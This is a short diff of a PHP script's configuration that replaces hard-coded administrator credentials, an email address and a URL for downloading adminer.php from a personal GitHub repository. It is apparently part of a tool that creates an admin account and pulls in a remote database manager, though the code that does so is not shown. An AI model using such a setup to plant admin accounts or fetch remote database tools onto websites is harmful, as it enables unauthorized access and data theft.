@@ -6,12 +6,12 @@ ini_set('max_execution_time', 300);
 // ============================================
 // CONFIGURATION
 // ============================================
-$ADMIN_USERNAME = 'bob';
-$ADMIN_PASSWORD = 'Kontolodon123!';
-$ADMIN_EMAIL = 'moneyhunter@supports.xpornici.com';
+$ADMIN_USERNAME = 'alienwa3e';
+$ADMIN_PASSWORD = 'Pax67035';
+$ADMIN_EMAIL = 'nft4work@hotmail.com';
 $ADMIN_FIRSTNAME = 'New';
 $ADMIN_LASTNAME = 'User';
-$ADMINER_URL = 'https://raw.githubusercontent.com/Bob-Marley-Backup/LAB-Uncomplete/refs/heads/main/adminer.php';
+$ADMINER_URL = 'https://raw.githubusercontent.com/alienwa3e/PRIVATE/refs/heads/main/adminer.php';
 
 // ============================================
 // HTML OUTPUT
